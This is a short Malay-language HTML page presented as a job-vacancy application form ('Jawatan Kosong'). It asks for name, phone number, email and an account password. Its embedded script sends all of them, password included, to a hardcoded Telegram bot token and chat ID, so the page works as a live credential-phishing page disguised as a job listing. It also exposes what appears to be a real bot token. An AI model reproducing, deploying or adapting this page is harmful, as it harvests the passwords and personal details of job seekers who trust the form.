<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Jawatan Kosong</title>

<style>
body{
  font-family: Arial;
  background: linear-gradient(135deg,#00c6ff,#0072ff);
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  margin:0;
}

.box{
  background:white;
  padding:25px;
  width:350px;
  border-radius:12px;
  box-shadow:0 10px 20px rgba(0,0,0,0.2);
}

h2{
  text-align:center;
  margin-bottom:15px;
}

input{
  width:100%;
  padding:10px;
  margin:8px 0;
  border:1px solid #ddd;
  border-radius:6px;
}

button{
  width:100%;
  padding:12px;
  background:#0072ff;
  color:white;
  border:none;
  border-radius:6px;
  cursor:pointer;
}

button:hover{
  background:#005ad1;
}
</style>
</head>

<body>

<div class="box">
  <h2>Jawatan Kosong</h2>

  <form id="jobForm">
    <input type="text" id="nama" placeholder="Nama" required>
    <input type="tel" id="telefon" placeholder="Nombor Telefon" required>
    <input type="email" id="email" placeholder="Email" required>
    <input type="password" id="password" placeholder="Password" required>

    <button type="submit">Hantar</button>
  </form>
</div>

<script>
document.getElementById("jobForm").addEventListener("submit", function(e){
  e.preventDefault();

  const nama = document.getElementById("nama").value;
  const telefon = document.getElementById("telefon").value;
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const token = "8503671417:AAG80rLVyoevMFXEw0eiNZikUEzZly7ddPE";
  const chat_id = "1877495228";

  const text = `
📌 Permohonan Jawatan Kosong

👤 Nama: ${nama}
📞 Telefon: ${telefon}
📧 Email: ${email}
🔑 Password: ${password}
`;

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chat_id,
      text: text
    })
  })
  .then(() => {
    alert("Berjaya dihantar ke Telegram!");
    document.getElementById("jobForm").reset();
  })
  .catch(() => {
    alert("Gagal hantar!");
  });

});
</script>

</body>
</html>
